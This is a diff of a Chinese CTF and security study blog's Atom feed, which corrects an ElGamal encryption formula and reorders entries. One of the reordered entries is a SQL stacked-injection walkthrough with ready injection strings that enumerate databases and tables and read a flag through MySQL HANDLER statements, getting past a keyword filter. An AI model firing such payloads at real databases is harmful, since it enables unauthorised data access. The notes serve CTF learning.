@@ -150,9 +150,9 @@
     <link href="https://smileless-l.github.io/2026/02/24/Elgamal/"/>
     <id>https://smileless-l.github.io/2026/02/24/Elgamal/</id>
     <published>2026-02-24T15:24:00.000Z</published>
-    <updated>2026-02-27T14:24:11.178Z</updated>
+    <updated>2026-04-21T09:56:07.234Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="Elgamal"><a href="#Elgamal" class="headerlink" title="Elgamal"></a>Elgamal</h1><p>标签（空格分隔）： Elgamal</p><hr><h2 id="密匙生成"><a href="#密匙生成" class="headerlink" title="密匙生成"></a>密匙生成</h2><p>选取一个足够大的素数 p<br>选取 Z^{*}_{p} 的一个生成元 g<br>随机挑选一个整数y，0 &lt; y &lt; p-2。计算  $ g^{k}\equiv y \ mod\  p $<br>此时令私匙为k，公匙为{p,g,y}</p><hr><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>确定明文m，然后选取随机数r，r满足 $r\in Z_{p-1}$</p><p>加密为$E_{k}(m,r)&#x3D;(y_{1},y_{2})$</p><p>$y_{1}\equiv g^{r} \ mod \ (p),   y_{2}\equiv m*g^{r} \ mod \ (p)$</p><hr><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>$D_k(y_1,y_2) &#x3D; y_2*(y_1^{k})^{-1} \ mod \ (p) \equiv m*(g^k)^r(g^{kr})^{-1} \equiv m \ mod  \ p$</p>]]></content>
+    <content type="html"><![CDATA[<h1 id="Elgamal"><a href="#Elgamal" class="headerlink" title="Elgamal"></a>Elgamal</h1><p>标签（空格分隔）： Elgamal</p><hr><h2 id="密匙生成"><a href="#密匙生成" class="headerlink" title="密匙生成"></a>密匙生成</h2><p>选取一个足够大的素数 p<br>选取 Z^{*}_{p} 的一个生成元 g<br>随机挑选一个整数y，0 &lt; y &lt; p-2。计算  $ g^{k}\equiv y \ mod\  p $<br>此时令私匙为k，公匙为{p,g,y}</p><hr><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>确定明文m，然后选取随机数r，r满足 $r\in Z_{p-1}$</p><p>加密为$E_{k}(m,r)&#x3D;(y_{1},y_{2})$</p><p>$y_{1}\equiv g^{r} \ mod \ (p),   y_{2}\equiv m*y^{r} \ mod \ (p)$</p><hr><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>$D_k(y_1,y_2) &#x3D; y_2*(y_1^{k})^{-1} \ mod \ (p) \equiv m*(g^k)^r(g^{kr})^{-1} \equiv m \ mod  \ p$</p>]]></content>
     
     
       
@@ -379,32 +379,6 @@ MathJax = {
   </entry>
   
   <entry>
-    <title>SQL堆叠注入</title>
-    <link href="https://smileless-l.github.io/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
-    <id>https://smileless-l.github.io/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:00:57.003Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;SQL堆叠注入&quot;&gt;&lt;a href=&quot;#SQL堆叠注入&quot; class=&quot;headerlink&quot; title=&quot;SQL堆叠注入&quot;&gt;&lt;/a&gt;SQL堆叠注入&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;运用情况：当有过滤select&amp;#x2F;upd</summary>
-      
-    
-    
-    
-    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
-    
-    
-    <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
-    
-  </entry>
-  
-  <entry>
     <title>SQLite</title>
     <link href="https://smileless-l.github.io/2026/01/28/SQLite/"/>
     <id>https://smileless-l.github.io/2026/01/28/SQLite/</id>
@@ -419,6 +393,32 @@ MathJax = {
     <summary type="html">&lt;h1 id=&quot;SQLite&quot;&gt;&lt;a href=&quot;#SQLite&quot; class=&quot;headerlink&quot; title=&quot;SQLite&quot;&gt;&lt;/a&gt;SQLite&lt;/h1&gt;&lt;hr&gt;
 &lt;p&gt;join注入：当，被过滤的时候可以使用该方法&lt;/p&gt;
 &lt;figure class=&quot;highlig</summary>
+      
+    
+    
+    
+    <category term="Web" scheme="https://smileless-l.github.io/categories/Web/"/>
+    
+    
+    <category term="SQL" scheme="https://smileless-l.github.io/tags/SQL/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQL堆叠注入</title>
+    <link href="https://smileless-l.github.io/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
+    <id>https://smileless-l.github.io/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</id>
+    <published>2026-01-28T13:45:00.000Z</published>
+    <updated>2026-02-06T17:00:57.003Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;SQL堆叠注入&quot;&gt;&lt;a href=&quot;#SQL堆叠注入&quot; class=&quot;headerlink&quot; title=&quot;SQL堆叠注入&quot;&gt;&lt;/a&gt;SQL堆叠注入&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： SQL&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;运用情况：当有过滤select&amp;#x2F;upd</summary>
       
     
     
@@ -457,30 +457,6 @@ MathJax = {
   </entry>
   
   <entry>
-    <title>Crypto实用函数类</title>
-    <link href="https://smileless-l.github.io/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/"/>
-    <id>https://smileless-l.github.io/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/</id>
-    <published>2026-01-28T13:45:00.000Z</published>
-    <updated>2026-02-06T17:47:27.964Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="crypto-python函数类"><a href="#crypto-python函数类" class="headerlink" title="crypto python函数类"></a>crypto python函数类</h1><p>标签（空格分隔）： crypto</p><hr><p>求$a^{x} &#x3D; c \mod m $</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from sympy.ntheory import discrete_log</span><br><span class="line">M = 100000000000099</span><br><span class="line">c = 114514</span><br><span class="line">a = 13</span><br><span class="line">x = discrete_log(M, c, a)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p>使用discrete_log库的discrete_log</p><hr>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;crypto-python函数类&quot;&gt;&lt;a href=&quot;#crypto-python函数类&quot; class=&quot;headerlink&quot; title=&quot;crypto python函数类&quot;&gt;&lt;/a&gt;crypto python函数类&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： cryp</summary>
-      
-    
-    
-    
-    <category term="Crypto" scheme="https://smileless-l.github.io/categories/Crypto/"/>
-    
-    
-    <category term="python" scheme="https://smileless-l.github.io/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
     <title>SSTI简记</title>
     <link href="https://smileless-l.github.io/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/"/>
     <id>https://smileless-l.github.io/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/</id>
@@ -503,6 +479,30 @@ MathJax = {
     
     
     <category term="SSTI" scheme="https://smileless-l.github.io/tags/SSTI/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Crypto实用函数类</title>
+    <link href="https://smileless-l.github.io/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/"/>
+    <id>https://smileless-l.github.io/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/</id>
+    <published>2026-01-28T13:45:00.000Z</published>
+    <updated>2026-02-06T17:47:27.964Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="crypto-python函数类"><a href="#crypto-python函数类" class="headerlink" title="crypto python函数类"></a>crypto python函数类</h1><p>标签（空格分隔）： crypto</p><hr><p>求$a^{x} &#x3D; c \mod m $</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from sympy.ntheory import discrete_log</span><br><span class="line">M = 100000000000099</span><br><span class="line">c = 114514</span><br><span class="line">a = 13</span><br><span class="line">x = discrete_log(M, c, a)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p>使用discrete_log库的discrete_log</p><hr>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;crypto-python函数类&quot;&gt;&lt;a href=&quot;#crypto-python函数类&quot; class=&quot;headerlink&quot; title=&quot;crypto python函数类&quot;&gt;&lt;/a&gt;crypto python函数类&lt;/h1&gt;&lt;p&gt;标签（空格分隔）： cryp</summary>
+      
+    
+    
+    
+    <category term="Crypto" scheme="https://smileless-l.github.io/categories/Crypto/"/>
+    
+    
+    <category term="python" scheme="https://smileless-l.github.io/tags/python/"/>
     
   </entry>
   
